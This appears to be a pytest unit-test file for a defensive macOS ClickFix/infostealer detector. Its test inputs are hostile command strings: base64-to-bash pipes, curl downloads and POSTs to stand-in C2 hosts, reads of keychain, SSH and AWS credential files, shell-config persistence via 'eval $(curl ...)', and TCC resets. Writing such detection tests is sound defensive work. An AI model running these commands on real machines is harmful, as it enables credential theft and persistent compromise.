"""
test_clickfix_detector.py — Unit tests for clickfix_detector.py

Run from repo root:
    cd tests && python3 -m pytest test_clickfix_detector.py -v
    # OR
    PYTHONPATH=../src/native python3 -m pytest test_clickfix_detector.py -v
"""

import json
import sys
import os

import pytest


from macskillet.native.clickfix_detector import detect_clickfix


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def make_features(strings=None, binary_path=None, sample_path=None,
                  sample_type="macho_binary", has_quarantine=True):
    """Build a minimal features dict for testing."""
    strings_of_interest = []
    if strings:
        for s in strings:
            strings_of_interest.append({"value": s, "category": "command", "risk": "HIGH"})

    return {
        "sample": {
            "name": os.path.basename(binary_path or sample_path or "test"),
            "path": sample_path or binary_path or "/Applications/test",
            "type": sample_type,
            "sha256": "aabbccdd" * 8,
        },
        "preflight": {
            "has_quarantine": has_quarantine,
            "quarantine_xattr": "0083;63f1a2b3;Safari;" if has_quarantine else None,
        },
        "bundle": {
            "main_executable": "test",
            "embedded_scripts": [],
        },
        "binary": {
            "strings_of_interest": strings_of_interest,
        },
    }


# ---------------------------------------------------------------------------
# Tests: Clean samples (should NOT flag)
# ---------------------------------------------------------------------------

class TestCleanSamples:

    def test_no_indicators_is_clean(self):
        features = make_features(strings=["Hello, World!", "NSApplication"])
        result = detect_clickfix(features)
        assert result["clickfix_suspected"] is False
        assert result["confidence"] == "NONE"
        assert result["score"] == 0

    def test_normal_binary_path(self):
        features = make_features(sample_path="/Applications/Firefox.app")
        result = detect_clickfix(features)
        assert result["clickfix_suspected"] is False

    def test_quarantine_present_no_strings(self):
        features = make_features(has_quarantine=True)
        result = detect_clickfix(features)
        assert result["clickfix_suspected"] is False


# ---------------------------------------------------------------------------
# Tests: Individual indicators
# ---------------------------------------------------------------------------

class TestDeliveryPrimitives:

    def test_base64_decode_pipe(self):
        features = make_features(strings=["base64 -d | bash"])
        result = detect_clickfix(features)
        assert result["score"] > 0
        assert any(i["indicator"] == "base64 -d" for i in result["matched_indicators"])

    def test_xattr_strip(self):
        features = make_features(strings=["xattr -c /tmp/helper"])
        result = detect_clickfix(features)
        assert any(i["indicator"] == "xattr -c" for i in result["matched_indicators"])
        assert result["matched_indicators"][0]["risk"] == "HIGH"

    def test_curl_insecure(self):
        features = make_features(strings=["curl -k https://evil.example.com/payload"])
        result = detect_clickfix(features)
        assert any(i["indicator"] == "curl -k" for i in result["matched_indicators"])

    def test_gunzip_decompression(self):
        features = make_features(strings=["base64 -D | gunzip | zsh"])
        result = detect_clickfix(features)
        assert any(i["indicator"] == "gunzip" for i in result["matched_indicators"])


class TestDropPaths:

    def test_tmp_helper_in_strings(self):
        features = make_features(strings=["curl -o /tmp/helper https://..."])
        result = detect_clickfix(features)
        assert any(i["indicator"] == "/tmp/helper" for i in result["matched_indicators"])

    def test_binary_in_tmp_directory(self):
        features = make_features(sample_path="/tmp/helper", has_quarantine=False)
        result = detect_clickfix(features)
        # Should get score for tmp path + no quarantine combination
        assert result["score"] >= 5

    def test_amos_staging_path(self):
        features = make_features(strings=["zip /tmp/osalogging.zip ~/Library"])
        result = detect_clickfix(features)
        assert any("osalogging" in i["indicator"] for i in result["matched_indicators"])


class TestExfiltration:

    def test_upload_php_endpoint(self):
        features = make_features(strings=["curl -X POST https://c2.example.com/upload.php"])
        result = detect_clickfix(features)
        assert any(i["indicator"] == "/upload.php" for i in result["matched_indicators"])

    def test_amos_bot_api(self):
        features = make_features(strings=["https://c2.example.com/api/v1/bot/joinsystem/abc"])
        result = detect_clickfix(features)
        assert any("/api/v1/bot/" in i["indicator"] for i in result["matched_indicators"])


class TestHarvesting:

    def test_keychain_db(self):
        features = make_features(strings=["cp ~/Library/Keychains/keychain.db /tmp/"])
        result = detect_clickfix(features)
        assert any("keychain.db" in i["indicator"] for i in result["matched_indicators"])

    def test_firefox_password_db(self):
        features = make_features(strings=["find ~/Library -name 'key4.db'"])
        result = detect_clickfix(features)
        assert any("key4.db" in i["indicator"] for i in result["matched_indicators"])

    def test_ssh_key_theft(self):
        features = make_features(strings=["cat ~/.ssh/id_rsa"])
        result = detect_clickfix(features)
        assert any(".ssh/id_rsa" in i["indicator"] for i in result["matched_indicators"])

    def test_aws_credentials(self):
        features = make_features(strings=["cat ~/.aws/credentials"])
        result = detect_clickfix(features)
        assert any("aws/credentials" in i["indicator"] for i in result["matched_indicators"])


class TestScriptEditorVector:

    def test_applescript_url_scheme(self):
        features = make_features(strings=["applescript://com.apple.scripteditor?source=..."])
        result = detect_clickfix(features)
        assert any(i["indicator"] == "applescript://" for i in result["matched_indicators"])
        assert result["delivery_chain"] == "chain_b_script_editor"

    def test_do_shell_script(self):
        features = make_features(strings=['do shell script "curl -k https://..."'])
        result = detect_clickfix(features)
        assert any(i["indicator"] == "do shell script" for i in result["matched_indicators"])
        assert result["delivery_chain"] == "chain_b_script_editor"


# ---------------------------------------------------------------------------
# Tests: Confidence levels
# ---------------------------------------------------------------------------

class TestConfidenceLevels:

    def test_low_confidence_single_indicator(self):
        features = make_features(strings=["base64 -d"])
        result = detect_clickfix(features)
        # Score = 3, should be LOW
        assert result["confidence"] in ("LOW", "MEDIUM")

    def test_high_confidence_multiple_indicators(self):
        features = make_features(
            sample_path="/tmp/helper",
            has_quarantine=False,
            strings=[
                "base64 -d | bash",
                "xattr -c /tmp/helper",
                "curl -k https://c2.example.com/upload.php",
                "/tmp/osalogging.zip",
                "keychain.db",
                ".ssh/id_rsa",
            ]
        )
        result = detect_clickfix(features)
        assert result["clickfix_suspected"] is True
        assert result["confidence"] == "HIGH"

    def test_delivery_chain_terminal(self):
        features = make_features(strings=["echo Y3Vy... | base64 -d | bash"])
        result = detect_clickfix(features)
        if result["clickfix_suspected"]:
            assert result["delivery_chain"] == "chain_a_terminal"


# ---------------------------------------------------------------------------
# Tests: Summary and output fields
# ---------------------------------------------------------------------------

class TestOutputFields:

    def test_always_has_required_fields(self):
        features = make_features()
        result = detect_clickfix(features)
        for field in ["clickfix_suspected", "confidence", "score",
                      "matched_indicators", "binary_signatures", "summary"]:
            assert field in result, f"Missing field: {field}"

    def test_summary_is_string(self):
        features = make_features()
        result = detect_clickfix(features)
        assert isinstance(result["summary"], str)
        assert len(result["summary"]) > 0

    def test_score_is_non_negative(self):
        features = make_features()
        result = detect_clickfix(features)
        assert result["score"] >= 0


# ---------------------------------------------------------------------------
# Tests: 2026 vendor-blog enrichment (new indicators)
# ---------------------------------------------------------------------------

class TestEnrichment2026:
    """New indicators from the 2026 macOS vendor-blog literature synthesis."""

    @pytest.mark.parametrize("pattern,carrier", [
        # A2 — decode-chain primitives
        ("openssl enc -d", "openssl enc -d -aes-256-cbc -in /tmp/x"),
        ("xxd -p -r", "echo deadbeef | xxd -p -r > /tmp/p"),
        # A3 — developer / cloud secret targets
        (".npmrc", "cat ~/.npmrc"),
        (".docker/config.json", "cat ~/.docker/config.json"),
        ("terraform.tfstate", "find . -name terraform.tfstate"),
        (".config/gcloud", "tar czf - ~/.config/gcloud"),
        # A4 — legitimate-cloud C2 / exfil
        ("api.telegram.org", "curl https://api.telegram.org/bot123/sendDocument"),
        ("dropboxapi.com", "curl https://content.dropboxapi.com/2/files/upload"),
        (".vercel.app", "curl https://stealer-c2.vercel.app/gate"),
        (".pages.dev", "curl https://payload.pages.dev/stage2"),
        # A5 — Ledger Live wallet trojanizing
        ("Ledger Live", "cp evil.asar /Applications/Ledger Live.app/.../app.asar"),
        # B2 — shell-config persistence
        (".zshenv", "echo 'eval $(curl -s url)' >> ~/.zshenv"),
        (".zshrc", "echo payload >> ~/.zshrc"),
        (".bash_profile", "echo payload >> ~/.bash_profile"),
        # B3 — TCC abuse
        ("tccutil reset", "tccutil reset All"),
        ("TCC.db", "sqlite3 ~/Library/Application Support/com.apple.TCC/TCC.db"),
        # B4/B5 — anti-analysis fingerprint + process masquerade
        ("hw.optional.arm.FEAT_", "sysctl hw.optional.arm.FEAT_SHA512"),
        ("exec -a", "exec -a mdworker_local /tmp/helper"),
        ("ioreg", "ioreg -rd1 -c IOPlatformExpertDevice"),
    ])
    def test_new_indicator_matches(self, pattern, carrier):
        features = make_features(strings=[carrier])
        result = detect_clickfix(features)
        assert any(i["indicator"] == pattern for i in result["matched_indicators"]), \
            f"expected indicator {pattern!r} to match in {carrier!r}"

    def test_zshenv_persistence_is_high_risk(self):
        """~/.zshenv is the alert-evasive persistence path — must be HIGH."""
        features = make_features(strings=["echo x >> ~/.zshenv"])
        result = detect_clickfix(features)
        zshenv = [i for i in result["matched_indicators"] if i["indicator"] == ".zshenv"]
        assert zshenv and zshenv[0]["risk"] == "HIGH"

    def test_clean_app_unaffected_by_new_indicators(self):
        """BENIGN REGRESSION: normal strings must not trip new indicators."""
        features = make_features(strings=["NSApplicationMain", "libswiftCore.dylib",
                                          "https://www.apple.com"])
        result = detect_clickfix(features)
        assert result["clickfix_suspected"] is False
        assert result["score"] == 0
